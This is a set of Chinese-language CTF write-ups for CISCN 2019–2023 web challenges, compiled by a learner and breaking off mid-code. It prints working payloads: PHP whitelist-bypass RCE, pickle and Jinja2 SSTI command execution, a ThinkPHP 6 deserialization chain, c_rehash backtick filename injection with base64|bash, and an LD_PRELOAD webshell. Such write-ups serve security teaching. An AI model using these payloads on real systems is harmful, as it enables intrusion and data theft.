show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', ' ','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 这题代码逻辑简单，就是传参进去的内容长度不超过80，并且其中的内容还要符合白名单，这里的正则的作用就是提取content变量中的函数名。最终目的是要RCE 这里刷题少，没知识点，直接看wp学了： 动态函数 php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数 例如：$function = \"sayHello\";$function();-》执行sayHello函数 php中函数名默认为字符串 例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择 方法很多，一个个学吧，其中最关键的函数就是base_convert，而我们最终的目的就是拼接函数+拼接变量的思路来构造payload base_convert ( string $number , int $frombase , int $tobase ) : string 返回一字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。意思就是将输入数字的进制进行转换。 可以使用这个函数将其他进制数转为36进制，而且36进制是包含所有数字和小写字母的。但终究无法构造GET大写字母。但又可以构造其他的小写字母函数，让构造的函数转换。 hexdec ( string $hex_string ) : number //十六进制转换为十进制 dechex ( int $number ) : string //十进制转换为十六进制 bin2hex ( string $str ) : string //函数把包含数据的二进制字符串转换为十六进制值 hex2bin ( string $data ) : string //转换十六进制字符串为二进制字符串 那么我们就可以想象一下，把_GET先利用bin2hex()转换为 十六进制，在利用hexdec()转换为十进制，那么反过来就可以把一段数字转换为字符。 但是binhex()， hexdec()等不是白名单的函数，要从哪里来？ 这时候就要看base_convert()的作用了，因为上面的函数都是小写的，所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符。这里三十六进制是10个数字+26个小写字母，因此能够完整表示出一个函数名的所有字符。 那么怎么才能直到这个数呢？我们可以先逆向将三十六进制字符转换为十进制数，得到该数字，最终逆向构造即可。 方法一： 接下来就是构造hex2bin与_GET字符串了，框架如下： ?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag//后面两个是传参,题目把东西都过滤的差不多了，只有数字，不可能有字母，所以用$_GET传参类似于上文的$a=cat。但是这里把[]过滤了，可以用{}代替 构造如下： base_convert('hex2bin',36,10); //37907361743 base_convert(37907361743,10,36); //hex2bin bin2hex('_GET'); //得到 5f474554 将字符转换为十六进制 hexdec('5f474554'); //得到 1598506324 将十六进制转为十进制 dechex(1598506324); //得到 5f474554 将十进制转换为十六进制 hex2bin('5f474554'); //得到 _GET 接下来编写payload ?c=$pi=bin_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos})&amp;abs=system&amp;cos=ls //进一步cat flag即可 方法二： 可以构造getallheaders()传参，此是小写的，可以直接用base_convert转换。 getallheaders ( void ) : array 获取全部 HTTP 请求头信息。首先构造system和getallheaders： base_convert('getallheaders',30,10); //得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功 base_convert('system',36,10); //得到1751504350 payload如下： ?c=$pi=base_convert;$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1}) HEADER: 1:cat /flag //system(getallheaders()[1]) 实际上就是找到键值为1对应的value 方法三： exec： hexdec(bin2hex('cat f*')); //得到109270211257898 base_convert('exec',36,10); //得到696468 payload： ?c=($pi=base_convert)(696468,10,36)($pi(76478043844,9,34)(dechex(109270211257898))) //exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*') 这里发现一个问题，这个payload超过了80的长度限制，所以只能换进制，最终如下（但测试之后不成功？？） /index.php?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898))) //分析：exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*') /index.php?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi)) //分析：system('cat'.dechex(16)^asinh^pi) =&gt; system('cat *') 方法四： 前面都是利用白名单的数学函数将数字转成字符串，其实也可以异或构造这是fuzz脚本 &lt;?php $payload=['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; for($k=1;$k&lt;=sizeof($payload);$k++){ for($i=0;$i&lt;9; $i++){ for($j=0;$j&lt;=9;$j++){ $exp=$payload[$k] ^$i.$j; echo($payload[$k].\"^$i$j\".\"==&gt;$exp\"); echo\"&lt;br /&gt;\"; } } } 得到is_nan^64==&gt;_G和tan^15==&gt;ET payload: ?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat flag.php //$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php ==&gt; system(cat flag.php) [CISCN 2019华北Day1]Web2 首先是一个脚本爆破 首页告诉我们要卖到lv6，那我们首先得找到它，由于页面很多，手动不现实，故此需要脚本找 import requests import time for i in range(0, 2000): time.sleep(0.5) url = 'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'.format(i) res = requests.get(url) if 'lv6.png' in res.text: print(\"找到lv6----{}\".format(i)) 如上图在181页，我们访问看看，我们在结算的时候抓包看看 如上图我们修改折扣进行购买，随后看到右侧有个重定向，我们访问看看b1g_m4mber 看到这里只允许admin访问，又看到其中有jwt，那毫无疑问就是伪造jtw了，那首先我们先要拿到secret，这里也是看wp发现是通过爆破找到secret的，直接上工具： github链接https://github.com/brendan-rius/c-jwt-cracker 用法这里就不赘述了，如上图可以看到secret是1Kun 如上图进行伪造之后发送到bp： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA 发送之后是如下页面： 成功以admin身份登录，接下来看一下源代码发现存在www.zip我们下载看看 如果我们上述成功的话，就会得到源码，我们找到Admin.py看到如下代码 import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) 分析可以知道，只有我们用户为admin，随后向become进行传参，内容为序列化内容之后由于render的存在，我们可以执行恶意代码，payload如下 import pickle import urllib class pop(object): def __reduce__(self): return(eval, (\"open('/flag.txt', 'r').read()\", )) poc = pop() s = pickle.dumps(poc) print(urllib.qoute(s))#注意上述题目中的p参数是经过urllib.unquote函数处理的 之后在python2环境下运行，向become传参即可 这里点击页面的一键成为大会员之后抓包，修改become参数，拿到flag [CISCN 2019华东南]Web4 首页发现存在ssrf，尝试几次发现file被ban，看了wp知道还有local_file可以用，直接读取源代码/app/app.py # encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! &lt;a href=\"/read?url=https://baidu.com\"&gt;Read somethings&lt;/a&gt;' @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response' @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied' if __name__=='__main__': app.run( debug=True, host=\"0.0.0.0\" ) 看代码知道将file、flag给ban了，但如果我们访问flag路由的时候，存在session且其中的username的键值为fuck，即可成功读取flag 同时页面抓包发现这是python2，这时候只需要重点看一下session-key是如何生成的： random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) 查询一番发现这里的uuid函数是用来获取Mac地址的，并将其当做随机数种子来生成key，那我们先读取一下Mac地址是什么 local_file:///sys/class/net/eth0/address 得到之后带入上述生成的key，并用py2运行，拿到key 接着使用脚本解密session即可 最后将加密后的结果修改进cookie即可 [CISCN 2019华东南]Double Secret 扫出三个目录，一个个试了，就如下页面有点用，发现有报错，但这里不知道为何我不能看报错代码。。。 直接借用wp的了 if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see' rc=rc4_Modified.RC4(\"HereIsTreasure\") #解密 deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!' return a 这里对secret内容进行rc4解密，随后对deS进行模板渲染，其中还有一个safe似乎是过滤函数，放一个rc4加密脚本 import base64 from urllib.parse import quote def rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4加密主函数\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # 我这里没管秘钥小于256的情况，小于256不断重复填充即可 # print(\"原来的 s 盒：%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"混乱后的 s 盒：%s\"% s_box) return s_box def rc4_excrypt(plain, box): # print(\"调用加密程序成功。\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(\"res用于加密字符串，加密后是：%res\" %res) cipher = \"\".join(res) print(\"加密后的字符串是：%s\" %quote(cipher)) #print(\"加密后的输出(经过编码):\") #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) #需要加密的字符串在这里修改 rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") 这里有佬说明：这里是后端对secret传入的值进行了RC4加密，RC4加密方式为，明文加密一次得到密文，密文在加密一次得到明文。所以要使用RC4脚本对我们传入的恶意字符串进行一次加密，这样传给系统，既绕过检测，同时还得到了明文得以执行 不过这道题似乎直接用上述的ssti直接读取flag即可 rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()}}\") 下标为59的是warnings.catch_warnings，直接利用即可： rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") 看了wp发现，可以通过执行py代码直接一步到位： {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")}}{% endif %}{% endfor %} 找到了flag位置，随后读取： {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag.txt').read()\")}}{% endif %}{% endfor %} [CISCN 2022 初赛]ezpop 这道题先是一个源码泄露，www.zip接着我们打开之后，看到如下路由：app/controller/index.php &lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { return '&lt;style type=\"text/css\"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=\"padding: 24px 48px;\"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V' . \\think\\facade\\App::version() . '&lt;br/&gt;&lt;span style=\"font-size:30px;\"&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style=\"font-size:25px;\"&gt;[ V6.0 版本由 &lt;a href=\"https://www.yisu.com/\" target=\"yisu\"&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=64890268\" charset=\"UTF-8\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"&gt;&lt;/script&gt;&lt;think id=\"ee9b1aa918103c4fc\"&gt;&lt;/think&gt;'; } public function hello($name = 'ThinkPHP6') { return 'hello,' . $name; } public function test() { unserialize($_POST['a']); } } 可以看到这里有反序列化入口点，加上如下图，直接暴露了版本，那上网找现成的pop即可 &lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this-&gt;lazySave = True; $this-&gt;data = ['whoami' =&gt; ['ls /']]; $this-&gt;exists = True; $this-&gt;table = $obj; $this-&gt;withAttr = ['whoami' =&gt; ['system']]; $this-&gt;json = ['whoami',['whoami']]; $this-&gt;jsonAssoc = True; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\\model\\Pivot(new think\\model\\Pivot())))); } 根据文章所说以及代码，我们找到index.php/index/test下直接post传入参数a即可 参考文章 ThinkPHP6.0.12LTS反序列漏洞分析 ThinkPHP 6.0.12 Unserialize RCE [CISCN 2022 初赛]online_crt 跟着附件我们看到后端是由Python和golang处理的，先看python def get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress): root_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, backend=default_backend() ) subject = issuer = x509.Name([ x509.NameAttribute(NameOID.COUNTRY_NAME, Country), x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province), x509.NameAttribute(NameOID.LOCALITY_NAME, City), x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName), x509.NameAttribute(NameOID.COMMON_NAME, CommonName), x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress), ]) root_cert = x509.CertificateBuilder().subject_name( subject ).issuer_name( issuer ).public_key( root_key.public_key() ).serial_number( x509.random_serial_number() ).not_valid_before( datetime.datetime.utcnow() ).not_valid_after( datetime.datetime.utcnow() + datetime.timedelta(days=3650) ).sign(root_key, hashes.SHA256(), default_backend()) crt_name = \"static/crt/\" + str(uuid.uuid4()) + \".crt\" with open(crt_name, \"wb\") as f: f.write(root_cert.public_bytes(serialization.Encoding.PEM)) return crt_name 上述代码是用来生成crt证书的 @app.route('/getcrt', methods=['GET', 'POST']) def upload(): Country = request.form.get(\"Country\", \"CN\") Province = request.form.get(\"Province\", \"a\") City = request.form.get(\"City\", \"a\") OrganizationalName = request.form.get(\"OrganizationalName\", \"a\") CommonName = request.form.get(\"CommonName\", \"a\") EmailAddress = request.form.get(\"EmailAddress\", \"a\") return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress) 这里是用来处理getcrt路由下的get和post方法，在upload函数中通过request.form.get提取form表单中指定参数的内容，如果没有的话，则按默认的来。最后调用get_crt函数生成证书 @app.route('/createlink', methods=['GET']) def info(): json_data = {\"info\": os.popen(\"c_rehash static/crt/ &amp;&amp; ls static/crt/\").read()} return json.dumps(json_data) 当访问createlink路由时，会调用popen函数执行c_rehash static/crt/ &amp;&amp; ls static/crt/，并最终将得到的结果按json数据格式返回 @app.route('/proxy', methods=['GET']) def proxy(): uri = request.form.get(\"uri\", \"/\") client = socket.socket() client.connect(('localhost', 8887)) msg = f'''GET {uri} HTTP/1.1 Host: test_api_host User-Agent: Guest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ''' client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode() 这里目的是与目标服务器localhost:8887建立连接，在想目标服务器发送http请求之后，返回目标服务器的响应 接着我们看一下go的代码 func admin(c *gin.Context) { staticPath := \"/app/static/crt/\" oldname := c.DefaultQuery(\"oldname\", \"\") newname := c.DefaultQuery(\"newname\", \"\") if oldname == \"\" || newname == \"\" || strings.Contains(oldname, \"..\") || strings.Contains(newname, \"..\") { c.String(500, \"error\") return } if c.Request.URL.RawPath != \"\" &amp;&amp; c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\") } func index(c *gin.Context) { c.String(200, \"hello world\") } func main() { router := gin.Default() router.GET(\"/\", index) router.GET(\"/admin/rename\", admin) if err := router.Run(\":8887\"); err != nil { panic(err) } } 首先在main函数中。如果访问/路由，则调用index函数；如果访问/admin/rename，则调用admin函数 其中index函数就单纯返回一个字符串；admin函数中首先获取旧的以及新的名字，随后判断其是否为空且字符串中是否包含..防止目录穿越；如果正常的话，接着判断url路径如果不是空，且host为admin则成功执行rename进行名字的更替。 题目中出现了 c_rehash，c_rehash是openssl中的一个用perl编写的脚本工具，用于批量创建证书等文件 hash命名的符号链接，c_rehash 有个命令注入漏洞 (CVE-2022-1292)，经过搜索网上并没有公开的exp (可能因为这个漏洞非常鸡肋)，只能通过diff进行分析 这里看不懂代码，看了wp之后说这里的fname没有进行过滤反引号就直接拼接到了上述箭头处的命令中，这意味着如果我们构造一个含有反引号的文件名，即可进行rce。 根据上述的分析以及wp我们可以有个思路，首先就是访问/getcrt获取证书以及文件名，随后就是要构造我们需要进行rce的文件名了，如果构造好并成功执行admin函数之后，我们直接访问createlink路由，其中info函数会通过popen执行我们的文件名，造成rce（ c_rehash 作用是让openssl在证书目录中能够找到证书） sub hash_dir { my %hashlist; print \"Doing $_[0] \"; #将当前目录切换到参数 $_[0] 指定的目录。 chdir $_[0]; #使用 opendir 打开目录，并读取该目录下的文件列表，使用 readdir 获取文件列表并按字母顺序排序 opendir(DIR, \".\"); my @flist = sort readdir(DIR); closedir DIR; #如果 $removelinks 变量为真，则删除符号链接文件。 if ( $removelinks ) { # Delete any existing symbolic links foreach (grep {/^[\\da-f]+\\.r{0,1}\\d+$/} @flist) { if (-l $_) { print \"unlink $_\" if $verbose; unlink $_ || warn \"Can't unlink $_, $! \"; } } } #对于符合特定文件名模式（以 .pem、.crt、.cer、.crl 结尾）的文件，调用 check_file 子例程检查文件内容是否符合证书或 CRL 格式。 FILE: foreach $fname (grep {/\\.(pem)|(crt)|(cer)|(crl)$/} @flist) { # Check to see if certificates and/or CRLs present. my ($cert, $crl) = check_file($fname); if (!$cert &amp;&amp; !$crl) { print STDERR \"WARNING: $fname does not contain a certificate or CRL: skipping \"; next; } link_hash_cert($fname) if ($cert);#如果文件包含证书，则调用 link_hash_cert 子例程处理证书。 link_hash_crl($fname) if ($crl);#如果文件包含 CRL，则调用 link_hash_crl 子例程处理 CRL。 } } 利用条件 执行c_rehash 目标目录下文件可控 文件后缀符合要求 文件内容必须包含证书或者是吊销列表 文件名可控 题目中生成证书的功能可以创建一个满足要求的文件 这里要实现文件名可控，重点就是go中的rename函数了，要调用该函数，首先需要绕过 if c.Request.URL.RawPath != \"\" &amp;&amp; c.Request.Host == \"admin\" 这里先看一个go语言URI.URL结构体（找不到原文章，借用师傅的图了） 也就是说url中必须含有待转移的字符，也就是经过url编码的字符，具体也可参考该文章解释 接下来先访问getcrt获取证书文件名：static/crt/39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt 接着请求 /proxy 修改证书名为恶意文件名，这里放一些师傅们说的坑点： linux文件名虽然可以包含大部分可打印字符，但是有一个除外 那就是斜杠，不能使用斜杠这限制了命令执行的内容 这里有位师傅做的是原环境：他当时选择了base64编码以及截断环境变量方式，但由于目标环境的限制无法成功；接着他就使用现有的环境变量 他通过env&gt;qweqwe命令在之后下载的文件看到了有一个变量值为/，接着变成功读取到了（这里就记录一下这种思路） uri=/admin%2frename?oldname=39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt&amp;newname=`ls%20${OLDPWD}&gt;yghj`.crt 这里我使用的是nssctf的环境，根据wp所述，这里使用base64方法即可 payload为： uri=/admin%2frename?oldname=39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt 这里需要将/url编码，空格编码接着继续将payload整体进行url编码。因为return data.decode()的存在 import urllib.parse uri = '''/admin%2frename?oldname=a1fdda8f-fbf7-42fd-9092-2d849967c6b5.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt HTTP/1.1 Host: admin ''' gopher = uri.replace(\" \",\"\\r \") payload = urllib.parse.quote(gopher) print(payload) 这里我们访问createlink触发上述代码的执行，之后访问/static/crt/flag.txt即可拿到flag（static目录可读） 参考文章 第15届全国大学生信息安全竞赛 online_crt writeup c_rehash(CVE-2022-1292) ciscn 2022 CTF | 2022 CISCN 初赛 WriteUp [CISCN 2022 初赛]online_crt [CISCN 2023 华北]ez_date &lt;?php error_reporting(0); highlight_file(__FILE__); class date{ public $a; public $b; public $file; public function __wakeup() { if(is_array($this-&gt;a)||is_array($this-&gt;b)){ die('no array'); } if( ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b)) ){ $content=date($this-&gt;file); $uuid=uniqid().'.txt'; file_put_contents($uuid,$content); $data=preg_replace('/((\\s)*( )+(\\s)*)/i','',file_get_contents($uuid)); echo file_get_contents($data); } else{ die(); } } } unserialize(base64_decode($_GET['code'])); 简单的反序列化，这里的正则表达式的作用就是将文件内容中所有连续的空格、换行和空白字符替换为空字符串。重点就是绕过第二个if语句。 这里的第一个if条件语句让我们无法通过数据绕过下面的md5强等，看了wp说可以利用数字和字符来绕过 另一个是date函数的绕过：date函数会对特定的字母转化为特定的时间表达格式 因此构造payload如下： &lt;?php error_reporting(0); highlight_file(__FILE__); class date{ public $a; public $b; public $file; } $pop = new date(); $pop-&gt;a = '1'; $pop-&gt;b = 1; $pop-&gt;file = \"/f\\l\\a\\g\"; echo base64_encode(serialize($pop)); ?&gt; 参考文章 （反序列化）小记录 [CISCN 2023 西南]do_you_like_read 点击登陆之后，根据提示用户名是admin，这里可以进行密码爆破，当然运气好直接弱口令：admin123即可登录 进去之后可以发现含有文件上传，文件编辑以及删除等功能，我们先尝试文件上传，但由于这是白盒审计，我们先看看上传文件代码如何写 if (isset($_FILES['image']) &amp;&amp; $_FILES['image']['name'] != \"\") { $image = $_FILES['image']['name']; // 检查文件名的扩展名是否已经是\".php\" $ext = pathinfo($image, PATHINFO_EXTENSION); if (strtolower($ext) == 'php'|| strtolower($ext) == 'phtml' || strtolower($ext) == 'php5' || strtolower($ext) == 'php2') { // 将文件名的扩展名替换为\".jpg\" $image = pathinfo($image, PATHINFO_FILENAME) . '.jpg'; } elseif (strtolower($ext) != 'jpg') { // 忽略其他后缀名并不做修改 $image = $_FILES['image']['name']; } $directory_self = str_replace(basename($_SERVER['PHP_SELF']), '', $_SERVER['PHP_SELF']); $uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . $directory_self . \"bootstrap/img/\"; $uploadDirectory .= $image; move_uploaded_file($_FILES['image']['tmp_name'], $uploadDirectory); } 重点就是上面这一块儿，这里的代码逻辑就是：黑名单限制我们的文件后缀，然后就不管了，其余的任何文件后缀都认为是正确的。那我们肯定就能利用.htaccess来进行文件上传了，文件内容如下： &lt;FilesMatch \"1.jpg\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这里指定的文件名可以随便，上传之后会发现没有权限去读取flag。这里就靠wp了，他们做这道题都是线下awd的模式，因此他们直接先是用自动化工具审计了一下： 我们可以看到第三个箭头处的似乎是一个后门文件（对我这个小白来说我不知道为何后门文件直接就在源码里） 我们根据路径看一下该文件， &lt;?php echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;\"; $cmd = $_GET[\"cmd\"]; $out_path = $_GET[\"outpath\"]; $evil_cmdline = $cmd . \" &gt; \" . $out_path . \" 2&gt;&amp;1\"; echo \"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: \" . $evil_cmdline . \"&lt;/p&gt;\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;\" . nl2br(file_get_contents($out_path)) . \"&lt;/p&gt;\"; unlink($out_path); ?&gt; 这里给出GPT对该文件内容的解释 这段 PHP 代码实现了一个简单的利用 LD_PRELOAD 绕过 disable_functions 的方法。具体来说，它的功能是执行一个命令，并将命令的输出重定向到指定文件中，然后再读取该文件的内容并显示出来。下面是代码的详细解析： 1. 第一行通过 GET 请求接收三个参数：cmd（要执行的命令）、outpath（输出文件路径）和 sopath（要加载的共享库路径）。 2. 接下来将接收到的 cmd 参数和 outpath 参数拼接成一个命令行字符串 evil_cmdline，其中包括将命令的输出重定向到指定文件的部分。 3. 使用 putenv 函数将 EVIL_CMDLINE 环境变量设置为 evil_cmdline。这样在后续的 mail 函数调用中，mail 函数会在执行时加载 EVIL_CMDLINE 环境变量中的命令。 4. 将接收到的 sopath 参数设置为 LD_PRELOAD 环境变量，以加载共享库文件。这个共享库文件通常用于重载系统调用，以实现特定功能，比如绕过 disable_functions。 5. 调用 mail 函数发送一封空邮件。由于在设置 LD_PRELOAD 环境变量后调用 mail 函数，因此 mail 函数在执行时会加载 LD_PRELOAD 环境变量中指定的共享库，从而执行设置的命令。 6. 最后通过读取输出文件的内容，并以 HTML 格式显示出来。同时使用 unlink 函数删除输出文件，以保证安全性。 这段代码的主要目的是演示利用 LD_PRELOAD 和重定向输出来绕过 PHP 的 disable_functions 的方法，同时也展示了一个非常不安全的代码实现。 结合上述PHP文件我们能知道payload为：不过这里的路径与nssctf环境下不一致，需要做出修改 echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;\"; // echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/app/bootstrap/test/bypass_disablefunc_x64.so &lt;/p&gt;\"; 这里的flag在环境变量中 参考文章 2023西南赛区ciscn – do you like read CISCN西南复赛AWDPlus Web [CISCN 2023 初赛]go_session 前置说明 这里借用师傅对该试题框架的说明 下载题目的附件，是用go的gin框架写的后端，cookie-session是由gorilla/sessions来实现，而sessions库使用了另一个库：gorilla/securecookie来实现对cookie的安全传输。这里所谓的安全传输，是指保证cookie中的值不能被看出来（通过加密实现，可选）、保证传输的cookie不会被篡改。 securecookie的编码函数一共有四个主要步骤来实现这一目的： 序列化，cookie的值可以有多种形式，首先将其序列化为字节切片，方便后续操作。 加密（这一步是可选的），使用指定的对称加密方法、加密密钥，进行对value进行加密。 计算MAC值，以保证不被篡改，这里的MAC是Message Authentication Code的缩写。如何计算呢，通过指定的哈希函数来计算，对上述的加密后的value求一个摘要。 base64编码，当解密时，反过来即可，因为上述用于加密的方法与加密密钥、用于认证的哈希方法与哈希密钥，都是在服务器端设置的。准确来说就是由这个securecookie库的SecureCookie接口所规定的，通过加密密钥与认证密钥，保证了cookie不会被解密、不会被篡改的两个目的。 代码审计 main.go package main import ( \"github.com/gin-gonic/gin\" \"main/route\" ) func main() { r := gin.Default() r.GET(\"/\", route.Index) r.GET(\"/admin\", route.Admin) r.GET(\"/flask\", route.Flask) r.Run(\"0.0.0.0:80\") } index路由的处理 var store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\"))) func Index(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { session.Values[\"name\"] = \"guest\" err = session.Save(c.Request, 